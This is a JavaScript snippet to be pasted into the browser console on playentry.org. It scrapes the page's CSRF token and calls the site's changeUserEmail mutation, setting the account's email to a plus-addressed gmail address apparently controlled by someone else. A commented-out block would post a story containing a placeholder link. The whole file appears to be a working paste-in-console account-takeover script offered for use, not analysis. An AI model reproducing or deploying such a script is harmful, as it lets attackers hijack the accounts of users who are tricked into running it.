//put this in console

function makeid(length) {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
      result += characters.charAt(Math.floor(Math.random() * 
 charactersLength));
   }
   return result;
}

const csrf=await fetch('https://playentry.org').then(r=>r.text()).then(c=>c.substr(c.indexOf('csrf-token')+21,36));

/*
fetch('https://playentry.org/graphql', {
  method: "POST",
  headers: {"Content-Type": "application/json",},
  body: JSON.stringify({
    "query":"\n    mutation CREATE_ENTRYSTORY(\n        \n    $content: String\n    $text: String\n    $image: String\n    $sticker: String\n    $cursor: String\n\n    ) {\n        createEntryStory(\n            \n    content: $content\n    text: $text\n    image: $image\n    sticker: $sticker\n    cursor: $cursor\n\n        ) {\n            warning\n            discuss{\n                \n    id\n    title\n    content\n    seContent\n    created\n    commentsLength\n    likesLength\n    visit\n    category\n    prefix\n    groupNotice\n    user {\n        \n    id\n    nickname\n    username\n    profileImage {\n        \n    id\n    name\n    label {\n        \n    ko\n    en\n    ja\n    vn\n\n    }\n    filename\n    imageType\n    dimension {\n        \n    width\n    height\n\n    }\n    trimmed {\n        filename\n        width\n        height\n    }\n\n    }\n    status {\n        following\n        follower\n    }\n    description\n    role\n\n    }\n    images {\n        filename\n        imageUrl\n    }\n    progress\n    thumbnail\n    reply\n    bestComment {\n        \n    id\n    user {\n        \n    id\n    nickname\n    username\n    profileImage {\n        \n    id\n    name\n    label {\n        \n    ko\n    en\n    ja\n    vn\n\n    }\n    filename\n    imageType\n    dimension {\n        \n    width\n    height\n\n    }\n    trimmed {\n        filename\n        width\n        height\n    }\n\n    }\n    status {\n        following\n        follower\n    }\n    description\n    role\n\n    }\n    content\n    created\n    removed\n    blamed\n    commentsLength\n    likesLength\n    isLike\n    hide\n    image {\n        \n    id\n    name\n    label {\n        \n    ko\n    en\n    ja\n    vn\n\n    }\n    filename\n    imageType\n    dimension {\n        \n    width\n    height\n\n    }\n    trimmed {\n        filename\n        width\n        height\n    }\n\n    }\n    sticker {\n        \n    id\n    name\n    label {\n        \n    ko\n    en\n    ja\n    vn\n\n    }\n    filename\n    imageType\n    dimension {\n        \n    width\n    height\n\n    }\n    trimmed {\n        filename\n        width\n        height\n    }\n\n    }\n\n    }\n    blamed\n\n            }\n        }\n    }\n",
    "variables":{
        "content":"yourlink.ml"
    }
})});*/

var randstr = makeid(6);

fetch('https://playentry.org/graphql', {
  method: "POST",
  headers: {"Content-Type": "application/json", "CSRF-Token": csrf},
  body: JSON.stringify({
    "query":"\n    mutation ($email: String!) {\n        changeUserEmail(email: $email) {\n            \n    status\n    result\n\n        }\n    }\n",
    "variables":{"email":`playentryauth+${randstr}@gmail.com`}
    })});

  console.log(randstr);